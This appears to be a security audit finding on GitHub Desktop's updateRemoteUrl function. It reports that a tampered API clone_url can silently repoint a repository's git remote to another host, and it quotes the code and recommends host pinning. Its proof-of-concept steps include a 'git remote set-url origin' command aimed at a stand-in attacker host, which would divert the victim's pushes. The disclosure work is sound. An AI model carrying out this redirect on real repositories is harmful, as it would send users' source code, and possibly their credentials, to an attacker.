### Title
Automatic `clone_url`-based remote-URL rewrite has no host-pinning, letting a malicious GitHub API response silently redirect pushes/fetches — ([File: app/src/lib/stores/updates/update-remote-url.ts])

### Summary
When Desktop refreshes a repository's GitHub metadata, `updateRemoteUrl` compares the previously known API `cloneURL` to the current git remote, and — if they still match and the URL "protocol" (scheme only) is unchanged — silently rewrites the local `origin` remote to whatever `clone_url` the API now returns, with no user prompt.

### Finding Description
`updateRemoteUrl` in [1](#0-0)  gates the automatic rewrite on three conditions: `protocolsMatch` (only checks `https:` vs `ssh:`/`git@`-style scheme via `URL.parse().protocol`), `remoteUrlUnchanged` (the git remote still matches the *previously cached* `gitHubRepository.cloneURL`), and `!urlsMatch` (the new API value differs from the current remote). None of these validate that the new `apiRepo.clone_url` still points at the same host as before — `protocolsMatch` is scheme-only, and the mismatch check `!urlsMatch` is specifically what allows a hostname change to slip through, since a hostname change is exactly what makes `urlsMatch` false.

This function is invoked unconditionally as part of `repositoryWithRefreshedGitHubRepository`, which every repository selection and background refresh calls: [2](#0-1) . The `apiRepo` there is the raw `IAPIRepository` object returned by `api.fetchRepository(owner, name)` — i.e., it is trusted verbatim from whatever GitHub API host the account's `endpoint` points to (this endpoint can be a self-hosted GitHub Enterprise Server the user added as an account). If that response's `clone_url` field is attacker-influenced (compromised/malicious GHES instance, or any MITM/compromise of the API transport for that specific repository object — the class of input this task explicitly treats as attacker-controlled), Desktop will call `gitStore.setRemoteURL` → `git remote set-url` [3](#0-2)  and rewrite the on-disk git config's remote URL to the attacker's chosen host, entirely silently, with no dialog akin to the one shown for the deliberate, user-initiated URL edit in `repository-settings.tsx`'s `onSubmit` [4](#0-3) .

Existing guards do not stop this path because:
- `protocolsMatch` only rejects a scheme change, not a host change.
- `urlMatchesRemote`/`urlsMatch` do compare hostname, but they're used only to *detect* that the API's clone URL differs from the local remote — that difference (including a hostname swap) is precisely the trigger condition, not something that blocks the update.
- There is no re-confirmation with the user before applying `setRemoteURL`.

### Impact Explanation
Once the remote is silently repointed, all subsequent `fetch`/`pull`/`push` operations for that repository target the attacker-controlled host without any user awareness. This directly matches the "silent corruption of what the user commits or pushes" impact category: proprietary source code pushed by the victim would go to the attacker's server instead of (or in addition to, if attacker's server proxies) the real one. If the attacker's host mimics a GitHub credential prompt, this can also be leveraged toward credential harvesting via the generic-git-authentication flow in the credential trampoline [5](#0-4) , since `getGitHubCredential` only special-cases known account endpoints and otherwise falls back to prompting the user for arbitrary host credentials.

### Likelihood Explanation
Requires the attacker to control the API response for a repository the victim has already added to Desktop (e.g., a compromised/malicious GitHub Enterprise Server the user authenticated against, or any position able to tamper with that specific `fetchRepository` response) — no local access, no leaked credentials, and no unusual click-through steps by the user; the rewrite happens automatically on ordinary repository refresh/selection.

### Recommendation
In `updateRemoteUrl`, require that the new `clone_url`'s hostname matches the existing remote's hostname (or the account's known endpoint host) before auto-rewriting, and/or surface a confirmation dialog to the user whenever the automatic update would change the host component of the remote URL, mirroring the explicit confirmation already required for manual edits in `repository-settings.tsx`.

### Proof of Concept
1. Victim adds a GitHub Enterprise Server account/repository in Desktop (or an attacker gains the ability to tamper with a `GET /repos/{owner}/{name}` response for a repo the victim has cloned).
2. The compromised/malicious server returns `clone_url: "https://attacker-controlled-host/owner/repo.git"` while keeping the scheme `https:`.
3. Desktop performs a routine refresh (repository selection, background fetch, focus event) which calls `repositoryWithRefreshedGitHubRepository` → `updateRemoteUrl` [2](#0-1) .
4. Because `protocolsMatch` is true, `remoteUrlUnchanged` is true (nothing local changed), and `!urlsMatch` is true (hostnames differ), `gitStore.setRemoteURL` is called and `git remote set-url origin https://attacker-controlled-host/owner/repo.git` is silently executed on disk.
5. The victim's next push in Desktop sends their commits to `attacker-controlled-host` with no warning shown.

export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
}
